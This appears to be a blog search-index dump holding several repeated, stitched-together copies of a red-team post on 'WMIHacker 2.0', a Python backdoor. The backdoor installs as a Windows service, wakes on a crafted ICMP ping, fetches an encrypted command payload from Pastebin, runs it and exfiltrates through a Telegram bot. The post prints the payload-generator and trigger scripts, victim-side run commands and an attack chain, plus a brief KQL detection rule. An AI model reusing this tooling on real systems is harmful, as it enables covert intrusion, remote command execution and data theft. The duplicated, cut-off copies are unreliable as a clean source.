(checker.py) sends a specially crafted ICMP Echo Request (ping) packet to a victim machine. The payload of the ICMP packet contains an identifier called PWN (Pastebin ID) that tells the backdoor on the victim side where to fetch the encrypted payload.\nAbove you can see the Proof of Concept implementation of the WMI-based backdoor.\nOn victims host:\nPS\u0026gt; python wmihacker.py \u0026lt;LOCAL IP\u0026gt; or\nPS\u0026gt; wmihacker.exe \u0026lt;LOCAL_IP\u0026gt; # build with PyInstaller I deployed whole project here: https://github.com/s0ld13rr/WMIHACKER\nThe attack chain might look this way:\nInitial access on a client machine via spear-phishing (T1566.001).\nThat machine sends a specially crafted packet to an internal Exchange server (already compromised).\nThe Exchange server, running a WMI backdoor, executes commands on other machines (T1047).\nCollected data is sent to a completely separate, hidden C2 server.\nAs I wrote in previus section, the WMIHACKER 2.0 use the asymmteric C2 approach for more stealthier lateral movement and execution. This is just a Proof-of-Concept tool and has several issues in OPSEC and Persistence.\nDetection \u0026amp; Response Continuous monitoring of infrastructure is the most effective approach to threat detection. To enhance security, it\u0026rsquo;s essential to regularly update detection rules and strengthen the infrastructure, thereby raising the cost of compromise.\nTo detect potential abuse of WMI in the context of WMIHacker-like activity, the following KQL (Kusto Query Language) detection rule can be used:\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe and event.code: 4688 and winlog.event_data.SubjectUserSid: \u0026quot;S-1-5-20\u0026quot;\nExplanation:\nevent.code: 4688 â€“ Triggers on the creation of a new process.\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe â€“ Filters for processes spawned by the WmiPrvSE.exe process, which is commonly used during WMI execution.\nSubjectUserSid: \u0026ldquo;S-1-5-20\u0026rdquo; â€“ Filters for the NETWORK SERVICE account, under which WMI may execute in certain contexts.\nResponse Actions:\nInvestigate the child process and command-line arguments.\nReview associated WMI event logs and consumer/subscription configurations.\nCorrelate with other telemetry such as network connections or abnormal service creation.\nApply endpoint detection \u0026amp; response (EDR) rules to block known malicious behaviors.\nConclusion WMI-based backdoors represent one of the stealthiest and most effective methods for post-exploitation in Windows environments. Leveraging native Windows components and protocols, WMI agents can perform lateral movement, execute commands, and retrieve system data without dropping binaries or creating noticeable artifacts.\nWhen integrated into an Asymmetric C2 architecture, these agents become even harder to detect and attribute, as they can operate via proxy nodes and relay chains deep within segmented networks.\n","permalink":"http://localhost:1313/posts/wmihacker-2.0/","summary":"\u003cblockquote\u003e\n\u003cp\u003eDISCLAIMER:\nThis article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\u003c/p\u003e\u003c/blockquote\u003e\n\u003ch2 id=\"table-of-contents\"\u003eTable of Contents\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#introduction\"\u003eIntroduction\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#earth-kurma-chain\"\u003eEarth Kurma Chain\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#symmetric--asymmetric-approach-in-c2-infra\"\u003eSymmetric \u0026amp; Asymmetric approach in C2 infra\u003c/a\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#symmetric-c2\"\u003eSymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#asymmetric-c2\"\u003eAsymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#wmihacker-20\"\u003eWMIHacker 2.0\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#detection--response\"\u003eDetection \u0026amp; Response\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#conclusion\"\u003eConclusion\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eIn this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\u003c/p\u003e","title":"WMIHacker 2.0 ðŸ‘¾"},{"content":" DISCLAIMER: This article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\nTable of Contents Introduction Earth Kurma Chain Symmetric \u0026amp; Asymmetric approach in C2 infra Symmetric C2 Asymmetric C2 WMIHacker 2.0 Detection \u0026amp; Response Conclusion Introduction In this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\nWeâ€™ll walk through a full attack chain using the new tool, exploring how it can be integrated into modern offensive operations. Finally, the article will cover methods for detecting such attacks and provide insights into improving defense mechanisms against them.\nTool Repo: https://github.com/s0ld13rr/WMIHACKER\nEarth Kurma Chain In Trend Microâ€™s analysis of the Earth Kurma APT campaign, attackers used WMIHACKER, an open-source post-exploitation tool designed to execute commands remotely over port 135 using WMI/DCOM â€” without relying on SMB or WinRM. Interestingly, the original script does not use Win32_Process directly for execution, which often causes compatibility issues.\nDuring my own experiments, I decided to refactor and change the concept of WMIHACKER to support stable Red Team operations inside real-world infrastructures, improving execution reliability, error handling, and output collection across segmented environments. By abusing native protocols and executing commands, it enables quiet lateral movement ideal for stealthy operations.\nSymmetric \u0026amp; Asymmetric approach in C2 infra But before we start observing wmihacker, I would like to explain the concept of symmetric and asymmetric C2 approaches. During the development of of this project and analysis of existing threat actor operations, I introduced and formalized two concepts that help classify C2 architectures more effectively: Symmetric C2 and Asymmetric C2.\nSymmetric C2 A Symmetric C2 approach is characterized by a direct and predictable interaction between the server (C2) and the agents (implants). Each agent directly communicates with a central C2 server, and the flow of command and data is relatively flat and transparent.\nKey Characteristics:\nOne-to-one or one-to-many agent-to-C2 relationship.\nThe C2 server maintains state and task queues for each agent.\nCommunication is typically periodic (beaconing, polling) or session-based (reverse shell, socks).\nEasier to map and detect from a defensive standpoint.\nUse Cases:\nPost-exploitation in isolated networks.\nCampaigns with short dwell time.\nControlled Red Team engagements.\nAsymmetric C2 An Asymmetric C2 approach involves a multi-layered, often indirect communication chain. Agents may not talk to the main C2 server directly; instead, they may receive commands or exfiltrate data via intermediate nodesâ€”other compromised machines or pivoting points.\nKey Characteristics:\nMulti-hop architecture, often involving lateral movement.\nCommands can be relayed through another compromised host (e.g., infected Exchange server with WMI agent).\nResults may be forwarded to another C2 server entirely.\nHarder to correlate agent actions to a single C2 node.\nResilient to takedown and more stealthy.\nUse Cases:\nAPT-level operations.\nRed Team simulations that mimic real-world actor TTPs.\nScenarios involving air-gapped or heavily segmented environments.\nWMIHacker 2.0 I decided to redesign the original VBS script and implement a backdoor in Python that installs itself as a service on the host system. This backdoor operates asymmetrically and is triggered when a specially crafted ICMP ECHO request is received. Once activated, it retrieves the payload and related instructions from Pastebin, executes the specified command, and extracts a Telegram bot token used for exfiltration.\ndef xorshift_encrypt(data: bytes, key: int) -\u0026gt; bytes: result = bytearray() state = key \u0026amp; 0xFFFFFFFF for b in data: state ^= (state \u0026lt;\u0026lt; 13) \u0026amp; 0xFFFFFFFF state ^= (state \u0026gt;\u0026gt; 17) state ^= (state \u0026lt;\u0026lt; 5) \u0026amp; 0xFFFFFFFF prng_byte = (state \u0026amp; 0xFF) result.append(b ^ prng_byte) return bytes(result) # all these parameters are used in the payload, change for your needs KEY=0xDEADBEEF TOKEN = \u0026#34;BOT TOKEN\u0026#34; CHAT_ID = \u0026#34;CHAT ID\u0026#34; IP_ADDR = \u0026#34;VICTIM_IP\u0026#34; USER = \u0026#34;USERNAME\u0026#34; PASSWORD = \u0026#34;PASSWORD\u0026#34; COMMAND = \u0026#34;echo \u0026#39;YOU HAVE BEEN PWNED!\u0026#39; \u0026gt; C:\\\\Users\\\\Administrator\\\\hello.txt\u0026#34; msg = f\u0026#34;{TOKEN}$$$${CHAT_ID}$$$${IP_ADDR}$$$${USER}$$$${PASSWORD}$$$${COMMAND}\u0026#34;.encode() enc = xorshift_encrypt(msg, KEY) print(enc.hex()) This code (payload_gen.py) is designed to generate an encrypted payload that contains all the necessary parameters for the backdoor to operate. The payload will be uploaded to Pastebin, and the implant (on the victim machine) will later fetch, decrypt, and execute it on remote host. Parameters are separated by $$$$ and scraped on the victim host. Also, no artifacts such as BOT TOKEN or CHAT ID will be placed inside the code. It hardens the OPSEC, and may maintain the less artifacts on OS.\nfrom scapy.all import * victim_ip = input(\u0026#34;Enter the victim\u0026#39;s IP address: \u0026#34;).strip() id = input(\u0026#34;Enter the Pastebin ID: \u0026#34;).strip() packet = IP(dst=victim_ip)/ICMP(type=8)/Raw(f\u0026#34;PWN:{id}\u0026#34;) packet.show() send(packet) print(\u0026#34;Packet sent!\u0026#34;) This script (checker.py) sends a specially crafted ICMP Echo Request (ping) packet to a victim machine. The payload of the ICMP packet contains an identifier called PWN (Pastebin ID) that tells the backdoor on the victim side where to fetch the encrypted payload.\nAbove you can see the Proof of Concept implementation of the WMI-based backdoor.\nOn victims host:\nPS\u0026gt; python wmihacker.py \u0026lt;LOCAL IP\u0026gt; or\nPS\u0026gt; wmihacker.exe \u0026lt;LOCAL_IP\u0026gt; # build with PyInstaller I deployed whole project here: https://github.com/s0ld13rr/WMIHACKER\nThe attack chain might look this way:\nInitial access on a client machine via spear-phishing (T1566.001).\nThat machine sends a specially crafted packet to an internal Exchange server (already compromised).\nThe Exchange server, running a WMI backdoor, executes commands on other machines (T1047).\nCollected data is sent to a completely separate, hidden C2 server.\nAs I wrote in previus section, the WMIHACKER 2.0 use the asymmteric C2 approach for more stealthier lateral movement and execution. This is just a Proof-of-Concept tool and has several issues in OPSEC and Persistence.\nDetection \u0026amp; Response Continuous monitoring of infrastructure is the most effective approach to threat detection. To enhance security, it\u0026rsquo;s essential to regularly update detection rules and strengthen the infrastructure, thereby raising the cost of compromise.\nTo detect potential abuse of WMI in the context of WMIHacker-like activity, the following KQL (Kusto Query Language) detection rule can be used:\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe and event.code: 4688 and winlog.event_data.SubjectUserSid: \u0026quot;S-1-5-20\u0026quot;\nExplanation:\nevent.code: 4688 â€“ Triggers on the creation of a new process.\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe â€“ Filters for processes spawned by the WmiPrvSE.exe process, which is commonly used during WMI execution.\nSubjectUserSid: \u0026ldquo;S-1-5-20\u0026rdquo; â€“ Filters for the NETWORK SERVICE account, under which WMI may execute in certain contexts.\nResponse Actions:\nInvestigate the child process and command-line arguments.\nReview associated WMI event logs and consumer/subscription configurations.\nCorrelate with other telemetry such as network connections or abnormal service creation.\nApply endpoint detection \u0026amp; response (EDR) rules to block known malicious behaviors.\nConclusion WMI-based backdoors represent one of the stealthiest and most effective methods for post-exploitation in Windows environments. Leveraging native Windows components and protocols, WMI agents can perform lateral movement, execute commands, and retrieve system data without dropping binaries or creating noticeable artifacts.\nWhen integrated into an Asymmetric C2 architecture, these agents become even harder to detect and attribute, as they can operate via proxy nodes and relay chains deep within segmented networks.\n","permalink":"http://localhost:1313/posts/wmihacker-2.0/","summary":"\u003cblockquote\u003e\n\u003cp\u003eDISCLAIMER:\nThis article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\u003c/p\u003e\u003c/blockquote\u003e\n\u003ch2 id=\"table-of-contents\"\u003eTable of Contents\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#introduction\"\u003eIntroduction\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#earth-kurma-chain\"\u003eEarth Kurma Chain\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#symmetric--asymmetric-approach-in-c2-infra\"\u003eSymmetric \u0026amp; Asymmetric approach in C2 infra\u003c/a\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#symmetric-c2\"\u003eSymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#asymmetric-c2\"\u003eAsymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#wmihacker-20\"\u003eWMIHacker 2.0\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#detection--response\"\u003eDetection \u0026amp; Response\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#conclusion\"\u003eConclusion\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eIn this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\u003c/p\u003e","title":"WMIHacker 2.0 ðŸ‘¾"},{"content":" DISCLAIMER: This article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\nTable of Contents Introduction Earth Kurma Chain Symmetric \u0026amp; Asymmetric approach in C2 infra Symmetric C2 Asymmetric C2 WMIHacker 2.0 Detection \u0026amp; Response Conclusion Introduction In this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\nWeâ€™ll walk through a full attack chain using the new tool, exploring how it can be integrated into modern offensive operations. Finally, the article will cover methods for detecting such attacks and provide insights into improving defense mechanisms against them.\nTool Repo: https://github.com/s0ld13rr/WMIHACKER\nEarth Kurma Chain In Trend Microâ€™s analysis of the Earth Kurma APT campaign, attackers used WMIHACKER, an open-source post-exploitation tool designed to execute commands remotely over port 135 using WMI/DCOM â€” without relying on SMB or WinRM. Interestingly, the original script does not use Win32_Process directly for execution, which often causes compatibility issues.\nDuring my own experiments, I decided to refactor and change the concept of WMIHACKER to support stable Red Team operations inside real-world infrastructures, improving execution reliability, error handling, and output collection across segmented environments. By abusing native protocols and executing commands, it enables quiet lateral movement ideal for stealthy operations.\nSymmetric \u0026amp; Asymmetric approach in C2 infra But before we start observing wmihacker, I would like to explain the concept of symmetric and asymmetric C2 approaches. During the development of of this project and analysis of existing threat actor operations, I introduced and formalized two concepts that help classify C2 architectures more effectively: Symmetric C2 and Asymmetric C2.\nSymmetric C2 A Symmetric C2 approach is characterized by a direct and predictable interaction between the server (C2) and the agents (implants). Each agent directly communicates with a central C2 server, and the flow of command and data is relatively flat and transparent.\nKey Characteristics:\nOne-to-one or one-to-many agent-to-C2 relationship.\nThe C2 server maintains state and task queues for each agent.\nCommunication is typically periodic (beaconing, polling) or session-based (reverse shell, socks).\nEasier to map and detect from a defensive standpoint.\nUse Cases:\nPost-exploitation in isolated networks.\nCampaigns with short dwell time.\nControlled Red Team engagements.\nAsymmetric C2 An Asymmetric C2 approach involves a multi-layered, often indirect communication chain. Agents may not talk to the main C2 server directly; instead, they may receive commands or exfiltrate data via intermediate nodesâ€”other compromised machines or pivoting points.\nKey Characteristics:\nMulti-hop architecture, often involving lateral movement.\nCommands can be relayed through another compromised host (e.g., infected Exchange server with WMI agent).\nResults may be forwarded to another C2 server entirely.\nHarder to correlate agent actions to a single C2 node.\nResilient to takedown and more stealthy.\nUse Cases:\nAPT-level operations.\nRed Team simulations that mimic real-world actor TTPs.\nScenarios involving air-gapped or heavily segmented environments.\nWMIHacker 2.0 I decided to redesign the original VBS script and implement a backdoor in Python that installs itself as a service on the host system. This backdoor operates asymmetrically and is triggered when a specially crafted ICMP ECHO request is received. Once activated, it retrieves the payload and related instructions from Pastebin, executes the specified command, and extracts a Telegram bot token used for exfiltration.\ndef xorshift_encrypt(data: bytes, key: int) -\u0026gt; bytes: result = bytearray() state = key \u0026amp; 0xFFFFFFFF for b in data: state ^= (state \u0026lt;\u0026lt; 13) \u0026amp; 0xFFFFFFFF state ^= (state \u0026gt;\u0026gt; 17) state ^= (state \u0026lt;\u0026lt; 5) \u0026amp; 0xFFFFFFFF prng_byte = (state \u0026amp; 0xFF) result.append(b ^ prng_byte) return bytes(result) # all these parameters are used in the payload, change for your needs KEY=0xDEADBEEF TOKEN = \u0026#34;BOT TOKEN\u0026#34; CHAT_ID = \u0026#34;CHAT ID\u0026#34; IP_ADDR = \u0026#34;VICTIM_IP\u0026#34; USER = \u0026#34;USERNAME\u0026#34; PASSWORD = \u0026#34;PASSWORD\u0026#34; COMMAND = \u0026#34;echo \u0026#39;YOU HAVE BEEN PWNED!\u0026#39; \u0026gt; C:\\\\Users\\\\Administrator\\\\hello.txt\u0026#34; msg = f\u0026#34;{TOKEN}$$$${CHAT_ID}$$$${IP_ADDR}$$$${USER}$$$${PASSWORD}$$$${COMMAND}\u0026#34;.encode() enc = xorshift_encrypt(msg, KEY) print(enc.hex()) This code (payload_gen.py) is designed to generate an encrypted payload that contains all the necessary parameters for the backdoor to operate. The payload will be uploaded to Pastebin, and the implant (on the victim machine) will later fetch, decrypt, and execute it on remote host. Parameters are separated by $$$$ and scraped on the victim host. Also, no artifacts such as BOT TOKEN or CHAT ID will be placed inside the code. It hardens the OPSEC, and may maintain the less artifacts on OS.\nfrom scapy.all import * victim_ip = input(\u0026#34;Enter the victim\u0026#39;s IP address: \u0026#34;).strip() id = input(\u0026#34;Enter the Pastebin ID: \u0026#34;).strip() packet = IP(dst=victim_ip)/ICMP(type=8)/Raw(f\u0026#34;PWN:{id}\u0026#34;) packet.show() send(packet) print(\u0026#34;Packet sent!\u0026#34;) This script (checker.py) sends a specially crafted ICMP Echo Request (ping) packet to a victim machine. The payload of the ICMP packet contains an identifier called PWN (Pastebin ID) that tells the backdoor on the victim side where to fetch the encrypted payload.\nAbove you can see the Proof of Concept implementation of the WMI-based backdoor.\nOn victims host:\nPS\u0026gt; python wmihacker.py \u0026lt;LOCAL IP\u0026gt; or\nPS\u0026gt; wmihacker.exe \u0026lt;LOCAL_IP\u0026gt; # build with PyInstaller I deployed whole project here: https://github.com/s0ld13rr/WMIHACKER\nThe attack chain might look this way:\nInitial access on a client machine via spear-phishing (T1566.001).\nThat machine sends a specially crafted packet to an internal Exchange server (already compromised).\nThe Exchange server, running a WMI backdoor, executes commands on other machines (T1047).\nCollected data is sent to a completely separate, hidden C2 server.\nAs I wrote in previus section, the WMIHACKER 2.0 use the asymmteric C2 approach for more stealthier lateral movement and execution. This is just a Proof-of-Concept tool and has several issues in OPSEC and Persistence.\nMITRE ATT Detection \u0026amp; Response Continuous monitoring of infrastructure is the most effective approach to threat detection. To enhance security, it\u0026rsquo;s essential to regularly update detection rules and strengthen the infrastructure, thereby raising the cost of compromise.\nTo detect potential abuse of WMI in the context of WMIHacker-like activity, the following KQL (Kusto Query Language) detection rule can be used:\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe and event.code: 4688 and winlog.event_data.SubjectUserSid: \u0026quot;S-1-5-20\u0026quot;\nExplanation:\nevent.code: 4688 â€“ Triggers on the creation of a new process.\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe â€“ Filters for processes spawned by the WmiPrvSE.exe process, which is commonly used during WMI execution.\nSubjectUserSid: \u0026ldquo;S-1-5-20\u0026rdquo; â€“ Filters for the NETWORK SERVICE account, under which WMI may execute in certain contexts.\nResponse Actions:\nInvestigate the child process and command-line arguments.\nReview associated WMI event logs and consumer/subscription configurations.\nCorrelate with other telemetry such as network connections or abnormal service creation.\nApply endpoint detection \u0026amp; response (EDR) rules to block known malicious behaviors.\nConclusion WMI-based backdoors represent one of the stealthiest and most effective methods for post-exploitation in Windows environments. Leveraging native Windows components and protocols, WMI agents can perform lateral movement, execute commands, and retrieve system data without dropping binaries or creating noticeable artifacts.\nWhen integrated into an Asymmetric C2 architecture, these agents become even harder to detect and attribute, as they can operate via proxy nodes and relay chains deep within segmented networks.\n","permalink":"http://localhost:1313/posts/wmihacker-2.0/","summary":"\u003cblockquote\u003e\n\u003cp\u003eDISCLAIMER:\nThis article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\u003c/p\u003e\u003c/blockquote\u003e\n\u003ch2 id=\"table-of-contents\"\u003eTable of Contents\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#introduction\"\u003eIntroduction\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#earth-kurma-chain\"\u003eEarth Kurma Chain\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#symmetric--asymmetric-approach-in-c2-infra\"\u003eSymmetric \u0026amp; Asymmetric approach in C2 infra\u003c/a\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#symmetric-c2\"\u003eSymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#asymmetric-c2\"\u003eAsymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#wmihacker-20\"\u003eWMIHacker 2.0\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#detection--response\"\u003eDetection \u0026amp; Response\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#conclusion\"\u003eConclusion\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eIn this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\u003c/p\u003e","title":"WMIHacker 2.0 ðŸ‘¾"},{"content":" DISCLAIMER: This article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\nTable of Contents Introduction Earth Kurma Chain Symmetric \u0026amp; Asymmetric approach in C2 infra Symmetric C2 Asymmetric C2 WMIHacker 2.0 Detection \u0026amp; Response Conclusion Introduction In this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\nWeâ€™ll walk through a full attack chain using the new tool, exploring how it can be integrated into modern offensive operations. Finally, the article will cover methods for detecting such attacks and provide insights into improving defense mechanisms against them.\nTool Repo: https://github.com/s0ld13rr/WMIHACKER\nEarth Kurma Chain In Trend Microâ€™s analysis of the Earth Kurma APT campaign, attackers used WMIHACKER, an open-source post-exploitation tool designed to execute commands remotely over port 135 using WMI/DCOM â€” without relying on SMB or WinRM. Interestingly, the original script does not use Win32_Process directly for execution, which often causes compatibility issues.\nDuring my own experiments, I decided to refactor and change the concept of WMIHACKER to support stable Red Team operations inside real-world infrastructures, improving execution reliability, error handling, and output collection across segmented environments. By abusing native protocols and executing commands, it enables quiet lateral movement ideal for stealthy operations.\nSymmetric \u0026amp; Asymmetric approach in C2 infra But before we start observing wmihacker, I would like to explain the concept of symmetric and asymmetric C2 approaches. During the development of of this project and analysis of existing threat actor operations, I introduced and formalized two concepts that help classify C2 architectures more effectively: Symmetric C2 and Asymmetric C2.\nSymmetric C2 A Symmetric C2 approach is characterized by a direct and predictable interaction between the server (C2) and the agents (implants). Each agent directly communicates with a central C2 server, and the flow of command and data is relatively flat and transparent.\nKey Characteristics:\nOne-to-one or one-to-many agent-to-C2 relationship.\nThe C2 server maintains state and task queues for each agent.\nCommunication is typically periodic (beaconing, polling) or session-based (reverse shell, socks).\nEasier to map and detect from a defensive standpoint.\nUse Cases:\nPost-exploitation in isolated networks.\nCampaigns with short dwell time.\nControlled Red Team engagements.\nAsymmetric C2 An Asymmetric C2 approach involves a multi-layered, often indirect communication chain. Agents may not talk to the main C2 server directly; instead, they may receive commands or exfiltrate data via intermediate nodesâ€”other compromised machines or pivoting points.\nKey Characteristics:\nMulti-hop architecture, often involving lateral movement.\nCommands can be relayed through another compromised host (e.g., infected Exchange server with WMI agent).\nResults may be forwarded to another C2 server entirely.\nHarder to correlate agent actions to a single C2 node.\nResilient to takedown and more stealthy.\nUse Cases:\nAPT-level operations.\nRed Team simulations that mimic real-world actor TTPs.\nScenarios involving air-gapped or heavily segmented environments.\nWMIHacker 2.0 I decided to redesign the original VBS script and implement a backdoor in Python that installs itself as a service on the host system. This backdoor operates asymmetrically and is triggered when a specially crafted ICMP ECHO request is received. Once activated, it retrieves the payload and related instructions from Pastebin, executes the specified command, and extracts a Telegram bot token used for exfiltration.\ndef xorshift_encrypt(data: bytes, key: int) -\u0026gt; bytes: result = bytearray() state = key \u0026amp; 0xFFFFFFFF for b in data: state ^= (state \u0026lt;\u0026lt; 13) \u0026amp; 0xFFFFFFFF state ^= (state \u0026gt;\u0026gt; 17) state ^= (state \u0026lt;\u0026lt; 5) \u0026amp; 0xFFFFFFFF prng_byte = (state \u0026amp; 0xFF) result.append(b ^ prng_byte) return bytes(result) # all these parameters are used in the payload, change for your needs KEY=0xDEADBEEF TOKEN = \u0026#34;BOT TOKEN\u0026#34; CHAT_ID = \u0026#34;CHAT ID\u0026#34; IP_ADDR = \u0026#34;VICTIM_IP\u0026#34; USER = \u0026#34;USERNAME\u0026#34; PASSWORD = \u0026#34;PASSWORD\u0026#34; COMMAND = \u0026#34;echo \u0026#39;YOU HAVE BEEN PWNED!\u0026#39; \u0026gt; C:\\\\Users\\\\Administrator\\\\hello.txt\u0026#34; msg = f\u0026#34;{TOKEN}$$$${CHAT_ID}$$$${IP_ADDR}$$$${USER}$$$${PASSWORD}$$$${COMMAND}\u0026#34;.encode() enc = xorshift_encrypt(msg, KEY) print(enc.hex()) This code (payload_gen.py) is designed to generate an encrypted payload that contains all the necessary parameters for the backdoor to operate. The payload will be uploaded to Pastebin, and the implant (on the victim machine) will later fetch, decrypt, and execute it on remote host. Parameters are separated by $$$$ and scraped on the victim host. Also, no artifacts such as BOT TOKEN or CHAT ID will be placed inside the code. It hardens the OPSEC, and may maintain the less artifacts on OS.\nfrom scapy.all import * victim_ip = input(\u0026#34;Enter the victim\u0026#39;s IP address: \u0026#34;).strip() id = input(\u0026#34;Enter the Pastebin ID: \u0026#34;).strip() packet = IP(dst=victim_ip)/ICMP(type=8)/Raw(f\u0026#34;PWN:{id}\u0026#34;) packet.show() send(packet) print(\u0026#34;Packet sent!\u0026#34;) This script (checker.py) sends a specially crafted ICMP Echo Request (ping) packet to a victim machine. The payload of the ICMP packet contains an identifier called PWN (Pastebin ID) that tells the backdoor on the victim side where to fetch the encrypted payload.\nAbove you can see the Proof of Concept implementation of the WMI-based backdoor.\nOn victims host:\nPS\u0026gt; python wmihacker.py \u0026lt;LOCAL IP\u0026gt; or\nPS\u0026gt; wmihacker.exe \u0026lt;LOCAL_IP\u0026gt; # build with PyInstaller I deployed whole project here: https://github.com/s0ld13rr/WMIHACKER\nThe attack chain might look this way:\nInitial access on a client machine via spear-phishing (T1566.001).\nThat machine sends a specially crafted packet to an internal Exchange server (already compromised).\nThe Exchange server, running a WMI backdoor, executes commands on other machines (T1047).\nCollected data is sent to a completely separate, hidden C2 server.\nAs I wrote in previus section, the WMIHACKER 2.0 use the asymmteric C2 approach for more stealthier lateral movement and execution. This is just a Proof-of-Concept tool and has several issues in OPSEC and Persistence.\nMITRE ATT\u0026amp;CK map Technique ID Description Spearphishing Attachment T1566.001 Initial access via email with malicious attachment Windows Management Instrumentation (WMI) T1047 Remote command execution using WMI Command and Scripting Interpreter: Python T1059.006 Use of Python for execution Ingress Tool Transfer T1105 Downloading payloads (e.g., from Pastebin) Application Layer Protocol: ICMP T1043 Use of ICMP for signaling Non-Application Layer Protocol T1095 C2 communication via non-standard protocols (e.g., ICMP) Exfiltration Over Web Service T1567.002 Exfiltration using Telegram Bot API Obfuscated Files or Information T1027 XOR encryption for payload confidentiality Proxy T1090 Asymmetric C2 using pivoting through internal nodes Detection \u0026amp; Response Continuous monitoring of infrastructure is the most effective approach to threat detection. To enhance security, it\u0026rsquo;s essential to regularly update detection rules and strengthen the infrastructure, thereby raising the cost of compromise.\nTo detect potential abuse of WMI in the context of WMIHacker-like activity, the following KQL (Kusto Query Language) detection rule can be used:\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe and event.code: 4688 and winlog.event_data.SubjectUserSid: \u0026quot;S-1-5-20\u0026quot;\nExplanation:\nevent.code: 4688 â€“ Triggers on the creation of a new process.\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe â€“ Filters for processes spawned by the WmiPrvSE.exe process, which is commonly used during WMI execution.\nSubjectUserSid: \u0026ldquo;S-1-5-20\u0026rdquo; â€“ Filters for the NETWORK SERVICE account, under which WMI may execute in certain contexts.\nResponse Actions:\nInvestigate the child process and command-line arguments.\nReview associated WMI event logs and 